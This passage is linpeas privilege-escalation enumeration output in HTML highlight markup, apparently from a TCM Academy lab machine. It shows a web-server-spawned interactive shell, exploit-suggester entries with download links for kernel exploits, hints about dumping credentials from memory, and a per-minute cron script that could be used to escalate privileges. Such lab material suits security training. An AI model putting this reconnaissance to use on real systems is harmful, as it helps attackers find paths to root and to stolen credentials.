0.08, 0.02, 0.01</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)</span></span><br><span class="line"><span class="string">disk                                                                                                                          </span></span><br><span class="line"><span class="string">sda</span></span><br><span class="line"><span class="string">sda1</span></span><br><span class="line"><span class="string">sda2</span></span><br><span class="line"><span class="string">sda5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Unmounted file-system?</span></span><br><span class="line"><span class="string">╚ Check if you can mount umounted devices                                                                                     </span></span><br><span class="line"><span class="string">UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                 </span></span><br><span class="line"><span class="string">UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0</span></span><br><span class="line"><span class="string">/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Environment</span></span><br><span class="line"><span class="string">╚ Any private information inside environment variables?                                                                       </span></span><br><span class="line"><span class="string">HISTFILESIZE=0                                                                                                                </span></span><br><span class="line"><span class="string">OLDPWD=/</span></span><br><span class="line"><span class="string">APACHE_RUN_DIR=/var/run/apache2</span></span><br><span class="line"><span class="string">APACHE_PID_FILE=/var/run/apache2/apache2.pid</span></span><br><span class="line"><span class="string">JOURNAL_STREAM=9:13249</span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span></span><br><span class="line"><span class="string">INVOCATION_ID=e90a63eda0df49cf8bebcb515095709a</span></span><br><span class="line"><span class="string">APACHE_LOCK_DIR=/var/lock/apache2</span></span><br><span class="line"><span class="string">LANG=C</span></span><br><span class="line"><span class="string">HISTSIZE=0</span></span><br><span class="line"><span class="string">APACHE_RUN_USER=www-data</span></span><br><span class="line"><span class="string">APACHE_RUN_GROUP=www-data</span></span><br><span class="line"><span class="string">APACHE_LOG_DIR=/var/log/apache2</span></span><br><span class="line"><span class="string">PWD=/tmp</span></span><br><span class="line"><span class="string">HISTFILE=/dev/null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching Signature verification failed in dmesg</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                        </span></span><br><span class="line"><span class="string">dmesg Not Found                                                                                                               </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Executing Linux Exploit Suggester</span></span><br><span class="line"><span class="string">╚ https://github.com/mzet-/linux-exploit-suggester                                                                            </span></span><br><span class="line"><span class="string">cat: write error: Broken pipe                                                                                                 </span></span><br><span class="line"><span class="string">cat: write error: Broken pipe</span></span><br><span class="line"><span class="string">cat: write error: Broken pipe</span></span><br><span class="line"><span class="string">cat: write error: Broken pipe</span></span><br><span class="line"><span class="string">[+] [CVE-2019-13272] PTRACE_TRACEME</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</span></span><br><span class="line"><span class="string">   Exposure: highly probable</span></span><br><span class="line"><span class="string">   Tags: ubuntu=16.04&#123;kernel:4.15.0-*&#125;,ubuntu=18.04&#123;kernel:4.15.0-*&#125;,debian=9&#123;kernel:4.9.0-*&#125;,[ debian=10&#123;kernel:4.19.0-*&#125; ],fedora=30&#123;kernel:5.0.9-*&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip</span></span><br><span class="line"><span class="string">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c</span></span><br><span class="line"><span class="string">   Comments: Requires an active PolKit agent.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2021-22555] Netfilter heap out-of-bounds write</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Tags: ubuntu=20.04&#123;kernel:5.8.0-*&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c</span></span><br><span class="line"><span class="string">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c</span></span><br><span class="line"><span class="string">   Comments: ip_tables kernel module must be loaded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Executing Linux Exploit Suggester 2</span></span><br><span class="line"><span class="string">╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                       </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Protections</span></span><br><span class="line"><span class="string">═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                 </span></span><br><span class="line"><span class="string">apparmor module is loaded.</span></span><br><span class="line"><span class="string">═╣ AppArmor profile? .............. unconfined</span></span><br><span class="line"><span class="string">═╣ is linuxONE? ................... s390x Not Found</span></span><br><span class="line"><span class="string">═╣ grsecurity present? ............ grsecurity Not Found                                                                      </span></span><br><span class="line"><span class="string">═╣ PaX bins present? .............. PaX Not Found                                                                             </span></span><br><span class="line"><span class="string">═╣ Execshield enabled? ............ Execshield Not Found                                                                      </span></span><br><span class="line"><span class="string">═╣ SELinux enabled? ............... sestatus Not Found                                                                        </span></span><br><span class="line"><span class="string">═╣ Seccomp enabled? ............... disabled                                                                                  </span></span><br><span class="line"><span class="string">═╣ User namespace? ................ enabled</span></span><br><span class="line"><span class="string">═╣ Cgroup2 enabled? ............... enabled</span></span><br><span class="line"><span class="string">═╣ Is ASLR enabled? ............... Yes</span></span><br><span class="line"><span class="string">═╣ Printer? ....................... No</span></span><br><span class="line"><span class="string">═╣ Is this a virtual machine? ..... Yes (vmware)                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                   ╔═══════════╗</span></span><br><span class="line"><span class="string">═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                           </span></span><br><span class="line"><span class="string">                                   ╚═══════════╝                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Container related tools present (if any):</span></span><br><span class="line"><span class="string">╔══════════╣ Am I Containered?                                                                                                </span></span><br><span class="line"><span class="string">╔══════════╣ Container details                                                                                                </span></span><br><span class="line"><span class="string">═╣ Is this a container? ........... No                                                                                        </span></span><br><span class="line"><span class="string">═╣ Any running containers? ........ No                                                                                        </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                     ╔═══════╗</span></span><br><span class="line"><span class="string">═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                           </span></span><br><span class="line"><span class="string">                                     ╚═══════╝                                                                                </span></span><br><span class="line"><span class="string">═╣ Google Cloud Platform? ............... No</span></span><br><span class="line"><span class="string">═╣ AWS ECS? ............................. No</span></span><br><span class="line"><span class="string">═╣ AWS EC2? ............................. No</span></span><br><span class="line"><span class="string">═╣ AWS EC2 Beanstalk? ................... No</span></span><br><span class="line"><span class="string">═╣ AWS Lambda? .......................... No</span></span><br><span class="line"><span class="string">═╣ AWS Codebuild? ....................... No</span></span><br><span class="line"><span class="string">═╣ DO Droplet? .......................... No</span></span><br><span class="line"><span class="string">═╣ Aliyun ECS? .......................... No</span></span><br><span class="line"><span class="string">═╣ IBM Cloud VM? ........................ No</span></span><br><span class="line"><span class="string">═╣ Azure VM? ............................ No</span></span><br><span class="line"><span class="string">═╣ Azure APP? ........................... No</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                ╔════════════════════════════════════════════════╗</span></span><br><span class="line"><span class="string">════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                            </span></span><br><span class="line"><span class="string">                ╚════════════════════════════════════════════════╝                                                            </span></span><br><span class="line"><span class="string">╔══════════╣ Cleaned processes</span></span><br><span class="line"><span class="string">╚ Check weird &amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes   </span></span><br><span class="line"><span class="string">root         1  0.0  0.9 103800 10036 ?        Ss   11:15   0:01 /sbin/init                                                   </span></span><br><span class="line"><span class="string">root       329  0.0  0.8  40368  8120 ?        Ss   11:15   0:00 /lib/systemd/systemd-journald</span></span><br><span class="line"><span class="string">root       349  0.0  0.5  22196  5152 ?        Ss   11:15   0:00 /lib/systemd/systemd-udevd</span></span><br><span class="line"><span class="string">systemd+   419  0.0  0.6  93084  6504 ?        Ssl  11:15   0:00 /lib/systemd/systemd-timesyncd</span></span><br><span class="line"><span class="string">  └─(Caps) 0x0000000002000000=cap_sys_time</span></span><br><span class="line"><span class="string">message+   421  0.0  0.4   8980  4380 ?        Ss   11:15   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only</span></span><br><span class="line"><span class="string">  └─(Caps) 0x0000000020000000=cap_audit_write</span></span><br><span class="line"><span class="string">root       428  0.0  0.6 225824  6108 ?        Ssl  11:15   0:00 /usr/sbin/rsyslogd -n -iNONE</span></span><br><span class="line"><span class="string">root       429  0.0  0.2   8504  2840 ?        Ss   11:15   0:00 /usr/sbin/cron -f</span></span><br><span class="line"><span class="string">root       430  0.0  0.7  19488  7292 ?        Ss   11:15   0:00 /lib/systemd/systemd-logind</span></span><br><span class="line"><span class="string">root       436  0.0  0.2   6620  2936 ?        Ss   11:15   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf</span></span><br><span class="line"><span class="string">root       443  0.0  0.3   7148  3612 tty1     Ss   11:15   0:00 /bin/login -p --</span></span><br><span class="line"><span class="string">root       644  0.0  0.4   7652  4504 tty1     S+   11:16   0:00  _ -bash</span></span><br><span class="line"><span class="string">root       453  0.0  0.6  15852  6912 ?        Ss   11:15   0:00 /usr/sbin/sshd -D</span></span><br><span class="line"><span class="string">root       521  0.0  2.2 214992 22840 ?        Ss   11:15   0:01 /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data   546  0.1  2.3 218796 23308 ?        S    11:15   0:15  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1615  0.0  1.9 215484 19468 ?        S    12:57   0:01  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  2138  0.0  0.0   2388   748 ?        S    13:44   0:00  |   _ sh -c uname -a; w; id; /bin/sh -i</span></span><br><span class="line"><span class="string">www-data  2142  0.0  0.0   2388   756 ?        S    13:44   0:00  |       _ /bin/sh -i</span></span><br><span class="line"><span class="string">www-data  2431  1.0  0.2   3404  2688 ?        S    14:16   0:00  |           _ /bin/sh ./linpeas.sh</span></span><br><span class="line"><span class="string">www-data  5153  0.0  0.1   3404  1224 ?        S    14:16   0:00  |               _ /bin/sh ./linpeas.sh</span></span><br><span class="line"><span class="string">www-data  5157  0.0  0.3   7960  3096 ?        R    14:16   0:00  |               |   _ ps fauxwww</span></span><br><span class="line"><span class="string">www-data  5156  0.0  0.1   3404  1224 ?        S    14:16   0:00  |               _ /bin/sh ./linpeas.sh</span></span><br><span class="line"><span class="string">www-data  1617  0.0  1.3 215516 13276 ?        S    12:57   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1632  0.0  1.3 215532 13296 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1650  0.0  1.2 215348 12696 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1655  0.0  1.8 215572 18844 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1657  0.0  1.9 215484 19540 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1663  0.0  1.9 215572 19468 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1665  0.0  1.8 215476 18788 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1668  0.0  1.9 215576 19692 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">mysql      541  0.0  9.1 1254884 92120 ?       Ssl  11:15   0:08 /usr/sbin/mysqld</span></span><br><span class="line"><span class="string">root       639  0.0  0.8  21024  8436 ?        Ss   11:16   0:00 /lib/systemd/systemd --user</span></span><br><span class="line"><span class="string">root       640  0.0  0.2  22836  2188 ?        S    11:16   0:00  _ (sd-pam)</span></span><br><span class="line"><span class="string">root       674  0.0  0.5   9488  5596 ?        Ss   11:20   0:00 dhclient</span></span><br><span class="line"><span class="string">root       690  0.0  0.5   9488  5736 ?        Ss   11:20   0:00 dhclient</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Binary processes permissions (non &#x27;</span>root root<span class="string">&#x27; and not belonging to current user)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                  </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Processes whose PPID belongs to a different user (not root)</span></span><br><span class="line"><span class="string">╚ You will know if a user can somehow spawn processes as a different user                                                     </span></span><br><span class="line"><span class="string">Proc 419 with ppid 1 is run by user systemd-timesync but the ppid user is root                                                </span></span><br><span class="line"><span class="string">Proc 421 with ppid 1 is run by user messagebus but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 541 with ppid 1 is run by user mysql but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 546 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1615 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1617 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1632 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1650 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1655 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1657 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1663 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1665 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1668 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Files opened by processes belonging to other users</span></span><br><span class="line"><span class="string">╚ This is usually empty because of the lack of privileges to read other user processes information                            </span></span><br><span class="line"><span class="string">COMMAND    PID TID TASKCMD               USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME                                      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Processes with credentials in memory (root req)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                            </span></span><br><span class="line"><span class="string">gdm-password Not Found                                                                                                        </span></span><br><span class="line"><span class="string">gnome-keyring-daemon Not Found                                                                                                </span></span><br><span class="line"><span class="string">lightdm Not Found                                                                                                             </span></span><br><span class="line"><span class="string">vsftpd process found (dump creds from memory as root)                                                                         </span></span><br><span class="line"><span class="string">apache2 process found (dump creds from memory as root)</span></span><br><span class="line"><span class="string">sshd Not Found</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Cron jobs</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                        </span></span><br><span class="line"><span class="string">/usr/bin/crontab                                                                                                              </span></span><br><span class="line"><span class="string">incrontab Not Found</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root    1077 Jun 16  2021 /etc/crontab                                                                      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.d:</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  712 Dec 17  2018 php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.daily:</span></span><br><span class="line"><span class="string">total 40</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.hourly:</span></span><br><span class="line"><span class="string">total 12</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.monthly:</span></span><br><span class="line"><span class="string">total 12</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.weekly:</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SHELL=/bin/sh</span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span></span><br><span class="line"><span class="string">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span></span><br><span class="line"><span class="string">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span></span><br><span class="line"><span class="string">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">* * * * * /home/grimmie/backup.sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Systemd PATH</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                </span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing .service files</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                   </span></span><br><span class="line"><span class="string">/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path                             </span></span><br><span class="line"><span class="string">/etc/systemd/system/mysql.service could be executing some relative path</span></span><br><span class="line"><span class="string">/etc/systemd/system/mysqld.service could be executing some relative path</span></span><br><span class="line"><span class="string">You can&#x27;</span>t write on systemd PATH</span><br><span class="line"></span><br><span class="line">╔══════════╣ System timers</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                     </span><br><span class="line">NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES      </span><br><span class="line">Thu 2024-02-15 14:39:00 EST  22min left Thu 2024-02-15 14:09:01 EST  7min ago     phpsessionclean.timer        phpsessionclean.service</span><br><span class="line">Fri 2024-02-16 00:00:00 EST  9h left    n/a                          n/a          logrotate.timer              logrotate.service</span><br><span class="line">Fri 2024-02-16 00:00:00 EST  9h left    n/a                          n/a          man-db.timer                 man-db.service</span><br><span class="line">Fri 2024-02-16 05:17:18 EST  15h left   n/a                          n/a          apt-daily.timer              apt-daily.service</span><br><span class="line">Fri 2024-02-16 06:58:25 EST  16h left   n/a                          n/a          apt-daily-upgrade.timer      apt-daily-upgrade.service</span><br><span class="line">Fri 2024-02-16 11:30:17 EST  21h left   Thu 2024-02-15 11:30:17 EST  2h 46min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service</span><br><span class="line"></span><br><span class="line">╔══════════╣ Analyzing .timer files</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                     </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ Analyzing .socket files</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                    </span><br><span class="line">/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                        </span><br><span class="line">/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket</span><br><span class="line">/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                                                </span><br><span class="line">/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                                                         </span><br><span class="line">/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                                                         </span><br><span class="line">/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog</span><br><span class="line">/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log</span><br><span class="line">/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout</span><br><span class="line">/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket</span><br><span class="line"></span><br><span class="line">╔══════════╣ Unix Sockets Listening</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                    </span><br><span class="line">sed: -e expression <span class="comment">#1, char 0: no previous regular expression                                                                 </span></span><br><span class="line">/run/dbus/system_bus_socket</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/mysqld/mysqld.sock</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/fsck.progress</span><br><span class="line">/run/systemd/journal/dev-log</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/journal/socket</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/journal/stdout</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/journal/syslog</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/notify</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/private</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/udev/control</span><br><span class="line">/run/user/0/systemd/private</span><br><span class="line">/var/run/dbus/system_bus_socket</span><br><span class="line">  └─(Read Write)</span><br><span class="line"></span><br><span class="line">╔══════════╣ D-Bus config files</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                      </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ D-Bus Service Objects list</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                      </span><br><span class="line">NAME                             PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION</span><br><span class="line">:1.0                               1 systemd         root             :1.0          init.scope                -          -</span><br><span class="line">:1.1                             419 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service -          -</span><br><span class="line">:1.17                            639 systemd         root             :1.17         user@0.service            -          -</span><br><span class="line">:1.282                          7944 busctl          www-data         :1.282        apache2.service           -          -</span><br><span class="line">:1.5                             430 systemd-logind  root             :1.5          systemd-logind.service    -          -</span><br><span class="line">org.freedesktop.DBus               1 systemd         root             -             init.scope                -          -</span><br><span class="line">org.freedesktop.hostname1          - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.locale1            - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.login1           430 systemd-logind  root             :1.5          systemd-logind.service    -          -</span><br><span class="line">org.freedesktop.network1           - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.resolve1           - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.systemd1           1 systemd         root             :1.0          init.scope                -          -</span><br><span class="line">org.freedesktop.timedate1          - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.timesync1        419 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service -          -</span><br><span class="line"></span><br><span class="line">                              ╔═════════════════════╗</span><br><span class="line">══════════════════════════════╣ Network Information ╠══════════════════════════════                                           </span><br><span class="line">                              ╚═════════════════════╝                                                                         </span><br><span class="line">╔══════════╣ Hostname, hosts and DNS</span><br><span class="line">academy                                                                                                                       </span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">127.0.1.1       academy.tcm.sec academy</span><br><span class="line"></span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">domain localdomain</span><br><span class="line">search localdomain</span><br><span class="line">nameserver 192.168.19.2</span><br><span class="line">tcm.sec</span><br><span class="line"></span><br><span class="line">╔══════════╣ Interfaces</span><br><span class="line">default         0.0.0.0                                                                                                       </span><br><span class="line">loopback        127.0.0.0</span><br><span class="line">link-local      169.254.0.0</span><br><span class="line"></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:ac:4e:32 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.19.141/24 brd 192.168.19.255 scope global dynamic ens33</span><br><span class="line">       valid_lft 1337sec preferred_lft 1337sec</span><br><span class="line">    inet6 fe80::20c:29ff:feac:4e32/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line">╔══════════╣ Active Ports</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                 </span><br><span class="line">tcp     LISTEN   0        80             127.0.0.1:3306          0.0.0.0:*                                                    </span><br><span class="line">tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      </span><br><span class="line">tcp     LISTEN   0        128                    *:80                  *:*      </span><br><span class="line">tcp     LISTEN   0        32                     *:21                  *:*      </span><br><span class="line">tcp     LISTEN   0        128                 [::]:22               [::]:*      </span><br><span class="line"></span><br><span class="line">╔══════════╣ Can I sniff with tcpdump?</span><br><span class="line">No                                                                                                                            </span><br><span class="line">                                                                                                                              </span><br><span class="line"></span><br><span class="line">                               ╔═══════════════════╗</span><br><span class="line">═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                           </span><br><span class="line">                               ╚═══════════════════╝                                                                          </span><br><span class="line">╔══════════╣ My user</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#<span class="built_in">users</span>                                                      </span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)                                                                         </span><br><span class="line"></span><br><span class="line">╔══════════╣ Do I have PGP keys?</span><br><span class="line">gpg Not Found                                                                                                                 </span><br><span class="line">netpgpkeys Not Found                                                                                                          </span><br><span class="line">netpgp Not Found                                                                                                              </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ Checking <span class="string">&#x27;sudo -l&#x27;</span>, /etc/sudoers, and 